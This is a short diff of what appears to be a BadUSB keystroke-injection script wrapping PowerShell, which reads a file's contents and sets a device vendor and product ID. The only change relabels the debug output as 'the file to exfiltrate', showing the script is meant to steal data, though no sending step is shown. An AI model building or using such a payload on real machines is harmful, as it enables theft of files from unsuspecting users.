@@ -28,7 +28,7 @@ REM ## Read the content of the file
 ALTSTRING $fileContent = Get-Content $sourceFilePath -Raw;
 
 REM ## Print the content of the file for debugging
-ALTSTRING Write-Output "Content of holamundo.txt: $fileContent";
+ALTSTRING Write-Output "Content of the file to exfiltrate: $fileContent";
 
 REM ## The VendorID and ProductID to search. If you'd change the BadUSB IDs in this script, you need to change $BHID as well.
 ALTSTRING $BHID="HID\\VID_046D\&PID_C529";
